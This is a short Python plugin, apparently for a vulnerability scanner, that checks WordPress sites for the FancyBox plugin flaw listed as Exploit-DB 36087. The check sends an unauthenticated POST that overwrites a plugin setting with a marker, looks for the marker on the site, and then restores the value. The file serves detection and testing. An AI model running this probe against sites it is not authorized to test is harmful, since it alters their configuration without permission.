#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '冷不冷'
#http://www.exploit-db.com/exploits/36087/

import re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    url = arg
    verify_url = url + '/wp-admin/admin-post.php?page=fancybox-for-wordpress'
    payload = 'action=update&mfbfw%5Bpadding%5D=VulnerableTag'
    curl.curl('-d ' + payload + ' -L ' + verify_url)
    code, head, res, errcode, _ = curl.curl('-L ' + url)
    clearload = 'action=update&mfbfw%5Bpadding%5D=10'
    curl.curl('-d ' + clearload + ' -L ' + verify_url)
    if 'VulnerableTag' in res:
        security_hole(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://192.168.80.80/wordpress')[1])
